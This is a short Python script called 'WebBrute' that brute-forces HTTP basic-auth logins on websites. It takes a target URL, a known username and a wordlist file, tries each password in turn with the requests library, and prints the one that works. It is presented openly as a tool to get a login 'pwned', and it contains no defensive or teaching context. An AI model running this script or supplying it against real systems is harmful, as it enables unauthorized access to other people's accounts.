import requests 
import time
import os

def banner():
    os.system('clear')
    print('''
    #     #               ######                             
#  #  # ###### #####  #     # #####  #    # ##### ###### 
#  #  # #      #    # #     # #    # #    #   #   #      
#  #  # #####  #####  ######  #    # #    #   #   #####  
#  #  # #      #    # #     # #####  #    #   #   #      
#  #  # #      #    # #     # #   #  #    #   #   #      
 ## ##  ###### #####  ######  #    #  ####    #   ###### 
             Made by Ian (Founder of HSCorp) ''')

print("\nStarting..")
banner()


def main():
    URL = str(input("\nEnter URL (Make sure to contain https://) or say help:-> "))
    if URL == 'help':
        print('''
        1. Enter the URL of the website.
        2. Enter a known username.
        3. Enter wordlists file path.
        4. Login gets pwned.
        
        **COMMANDS**
        1. help (Brings up this menu.)
        2. clear (Clears screen.)
        3. exit (Exits the program.) ''')
        main()
    elif URL == 'clear':
        os.system('clear')
        main()
    elif URL == 'exit':
        exit()
    uname = input("Enter known username:-> ")
    wlpath = input("Enter wordlist file path:-> ")

    print("\nPwning login..")
    time.sleep(2)
   
    for line in open('{}'.format(wlpath)):
        password = line.strip()
        flogin = (uname, password)
        BruteForce = requests.get(URL, auth=flogin)

        print('<~~~~~~~~~~', password, '~~~~~~~~~~>')

        if BruteForce:
            print(BruteForce.text)
            time.sleep(1)
            print("[!] Password is:", password, '[!]')
            break
            exit()

main()
